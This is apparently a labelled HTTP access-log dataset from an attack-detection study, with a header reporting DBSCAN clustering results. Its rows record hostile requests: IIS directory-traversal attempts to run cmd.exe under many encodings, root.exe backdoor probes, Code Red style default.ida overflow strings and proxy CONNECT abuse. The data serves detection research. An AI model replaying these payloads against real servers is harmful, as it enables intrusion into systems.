#------------------------------------------------------------------------------------------------------------
#  ~ DateTime: 2020-05-29 16:54:53
#  ~ Dataframe name: "http_access_log"
#  ~ Number of events in the dataframe: 3554
#  ~ Number of unique labels ('label_event_type') in the dataframe: 12
#  ~ Selected features set for the clustering: ['HTTP_method', 'ClientRequestLine@', 'StatusCode', 'ObjectSize~', 'Referrer~', 'Agent@']
#  ~ The dataframe was scaled using the scaler: MinMaxScaler
#  ~ Parameters:  EPS=0.10286568826994683  MinPts=2 (The EPS parameter was calculated in 0.006379 seconds)
#  ~ The DBSCAN clustering process was performed in 0.193605 seconds
#  ~ Results summary: (20 Clus. | 5 Outl. | Homg.: 99.93% | Comp.: 93.22% | V-measure: 96.46% | AR: 97.24% | AMI: 93.13%)
#
#  ~ Details of clusters:
#       Cluster [0] contains 484 items. MV:["AE0"]. Details:{'AE': 484}
#       Cluster [1] contains 979 items. MV:["AA1"]. Details:{'AA': 979}
#       Cluster [2] contains 109 items. MV:["AB2"]. Details:{'AB': 109}
#       Cluster [3] contains 86 items. MV:["AE3"]. Details:{'AE': 86}
#       Cluster [4] contains 587 items. MV:["AC4"]. Details:{'AC': 587}
#       Cluster [5] contains 23 items. MV:["AD5"]. Details:{'AD': 23}
#       Cluster [6] contains 14 items. MV:["AD6"]. Details:{'AD': 14}
#       Cluster [7] contains 3 items. MV:["AC7"]. Details:{'AC': 3}
#       Cluster [8] contains 46 items. MV:["AI8"]. Details:{'AI': 46}
#       Cluster [9] contains 100 items. MV:["AH9"]. Details:{'AH': 100}
#       Cluster [10] contains 125 items. MV:["AF10"]. Details:{'AF': 125}
#       Cluster [11] contains 16 items. MV:["AD11"]. Details:{'AD': 16}
#       Cluster [12] contains 32 items. MV:["AH12"]. Details:{'AH': 32}
#       Cluster [13] contains 769 items. MV:["AJ13"]. Details:{'AJ': 769}
#       Cluster [14] contains 14 items. MV:["AK14"]. Details:{'AK': 14}
#       Cluster [15] contains 54 items. MV:["AK15"]. Details:{'AE': 1, 'AK': 53}
#       Cluster [16] contains 5 items. MV:["AD16"]. Details:{'AD': 5}
#       Cluster [17] contains 57 items. MV:["AL17"]. Details:{'AL': 57}
#       Cluster [18] contains 23 items. MV:["AG18"]. Details:{'AG': 23}
#       Cluster [19] contains 23 items. MV:["AK19"]. Details:{'AK': 23}
#
#  ~ Details of outliers: {'AC': 1, 'AD': 1, 'AE': 3}
#
#  ~ Confusion matrix:
#     +--------+-----------------------------------------------------------------------------------+
#     | Actual +                                    Predicted                                      |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |        |  AA  |  AB  |  AC  |  AD  |  AE  |  AF  |  AG  |  AH  |  AI  |  AJ  |  AK  |  AL  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#     |   AA   | 979  |      |      |      |      |      |      |      |      |      |      |      |
#     |   AB   |      | 109  |      |      |      |      |      |      |      |      |      |      |
#     |   AC   |      |      | 590  |      |      |      |      |      |      |      |      |      |
#     |   AD   |      |      |      |  58  |      |      |      |      |      |      |      |      |
#     |   AE   |      |      |      |      | 570  |      |      |      |      |      |  1   |      |
#     |   AF   |      |      |      |      |      | 125  |      |      |      |      |      |      |
#     |   AG   |      |      |      |      |      |      |  23  |      |      |      |      |      |
#     |   AH   |      |      |      |      |      |      |      | 132  |      |      |      |      |
#     |   AI   |      |      |      |      |      |      |      |      |  46  |      |      |      |
#     |   AJ   |      |      |      |      |      |      |      |      |      | 769  |      |      |
#     |   AK   |      |      |      |      |      |      |      |      |      |      |  90  |      |
#     |   AL   |      |      |      |      |      |      |      |      |      |      |      |  57  |
#     +--------+------+------+------+------+------+------+------+------+------+------+------+------+
#
#  ~ Note: to import this file into Python, use: "DF = pandas.read_csv(file_name, sep=',', comment='#')"
#
#------------------------------------------------------------------------------------------------------------
DateTime~,Http_protocol@,ObjectSize~,Agent@,HTTP_method,ClientRequestLine@,StatusCode,ClientIP$,Referrer~,label_event_type~,label_IPpair_ID~,phase1_predicted_label~
1107264800,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9221184100013,"-","AB","S276","A_2"
1107264801,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264801,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9221184100013,"-","AA","S276","A_1"
1107264870,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9064192107195,"-","AE","S442","A_0"
1107265953,"-",1061,"-","GET","/NULL.printer","'404'",9081006250202,"-","AA","S575","A_1"
1107277272,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9193095148135,"-","AE","S51","A_0"
1107278838,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218242255106,"-","AE","S204","A_0"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107279931,"HTTP/1.0",2898,"-","GET","/","'403'",9069086160253,"-","AE","S552","A_3"
1107287312,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9063245085123,"-","AA","S434","A_1"
1107291127,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9064085244116,"-","AE","S448","A_0"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300922,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300923,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300923,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300923,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300923,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300923,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300923,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300923,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300931,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300931,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300931,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107300931,"HTTP/1.0",975,"-","CONNECT","1.3.3.7:1337","'405'",9082229169073,"-","AD","S578","A_5"
1107304630,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9219134043080,"-","AE","S239","A_0"
1107304711,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9143127131004,"-","AE","S17","A_0"
1107346378,"HTTP/1.0",1061,"-","GET","/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a","'404'",9066117040185,"-","AA","S464","A_1"
1107358087,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9063162143021,"-","AE","S428","A_0"
1107364650,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364652,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364654,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364656,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364658,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364659,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364661,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364663,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364665,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364667,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364668,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364670,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364672,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9069086164233,"-","AB","S553","A_2"
1107364674,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9069086164233,"-","AB","S553","A_2"
1107364676,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107364677,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9069086164233,"-","AA","S553","A_1"
1107369164,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9063175119002,"-","AE","S429","A_0"
1107371977,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9066042059082,"-","AE","S483","A_0"
1107379567,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9204076166050,"-","AE","S97","A_0"
1107380220,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218011001050,"-","AE","S183","A_0"
1107397984,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397985,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397986,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397986,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397987,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397988,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397988,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397989,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397990,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397990,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397994,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397995,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397995,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9060248026050,"-","AB","S358","A_2"
1107397996,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9060248026050,"-","AB","S358","A_2"
1107397996,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107397997,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9060248026050,"-","AA","S358","A_1"
1107401224,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222084042191,"-","AE","S317","A_0"
1107415908,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9218106185078,"-","AE","S182","A_0"
1107419135,"-",1061,"-","GET","/NULL.printer","'404'",9081006250202,"-","AA","S575","A_1"
1107453651,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061010007091,"-","AE","S382","A_0"
1107462291,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462292,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462292,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462293,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462293,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462292,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462293,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462293,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462294,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462294,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462294,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462293,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462293,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462294,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462294,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462293,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462294,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462295,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462295,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462293,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462295,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462295,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107462294,"HTTP/1.0",1061,"-","GET","/sumthin","'404'",9210127248052,"-","AA","S125","A_1"
1107467544,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061010007168,"-","AE","S369","A_0"
1107480557,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9067133116245,"-","AE","S494","A_0"
1107491267,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9222166160220,"-","AE","S301","A_0"
1107506213,"HTTP/1.0",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver","'404'",9067176032032,"-","AA","S504","A_1"
1107508296,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9220168210035,"-","AE","S259","A_0"
1107510265,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9012033114007,"-","AE","S3","A_0"
1107512009,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512010,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512011,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512011,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512012,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512013,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512014,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512015,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512015,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512016,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512017,"HTTP/1.0",1041,"-","GET","/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512017,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512018,"HTTP/1.0",974,"-","GET","/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir","'400'",9220028212176,"-","AB","S270","A_2"
1107512018,"HTTP/1.0",974,"-","GET","/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir","'400'",9220028212176,"-","AB","S270","A_2"
1107512019,"HTTP/1.0",1041,"-","GET","/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107512020,"HTTP/1.0",1041,"-","GET","/scripts/..%252f../winnt/system32/cmd.exe?/c+dir","'404'",9220028212176,"-","AA","S270","A_1"
1107519363,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9143127131004,"-","AE","S17","A_0"
1107521081,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9209137237154,"-","AE","S118","A_0"
1107524604,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061180025164,"-","AE","S398","A_0"
1107530763,"HTTP/1.0",1061,"-","GET","/scripts/..%255c%255c../winnt/system32/cmd.exe?/c+ver","'404'",9081006250202,"-","AA","S575","A_1"
1107533767,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9035011228062,"-","AE","S346","A_0"
1107544667,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9216010108138,"-","AE","S163","A_0"
1107544668,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9064085244116,"-","AE","S448","A_0"
1107546810,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9061186047103,"-","AE","S401","A_0"
1107559173,"HTTP/1.1",2898,"Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)","GET","/","'403'",9210139114144,"-","AE","S126","A_0"
1107568998,"HTTP/1.0",1050,"-","GET","/sumthin","'404'",9061030127004,"-","AA","S412","A_1"
1107568998,"HTTP/1.0",1050,"-","GET","/sumthin","'404'",9061030127004,"-","AA","S412","A_1"
1107569001,"HTTP/1.0",1050,"-","GET","/sumthin","'404'",9061030127004,"-","AA","S412","A_1"
1107578326,"HTTP/1.0",1041,"-","GET","/scripts/root.exe?/c+dir","'404'",9172169006104,"-","AA","S40","A_1"
1107578327,"HTTP/1.0",1041,"-","GET","/MSADC/root.exe?/c+dir","'404'",9172169006104,"-","AA","S40","A_1"
1107578328,"HTTP/1.0",1041,"-","GET","/c/winnt/system32/cmd.exe?/c+dir","'404'",9172169006104,"-","AA","S40","A_1"
1107578329,"HTTP/1.0",1041,"-","GET","/d/winnt/system32/cmd.exe?/c+dir","'404'",9172169006104,"-","AA","S40","A_1"
1107578329,"HTTP/1.0",1041,"-","GET","/scripts/..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9172169006104,"-","AA","S40","A_1"
1107578330,"HTTP/1.0",1041,"-","GET","/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9172169006104,"-","AA","S40","A_1"
1107578331,"HTTP/1.0",1041,"-","GET","/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir","'404'",9172169006104,"-","AA","S40","A_1"
1107578331,"HTTP/1.0",1041,"-","GET","/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9172169006104,"-","AA","S40","A_1"
1107578332,"HTTP/1.0",1041,"-","GET","/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir","'404'",9172169006104,"-","AA","S40","A_1"
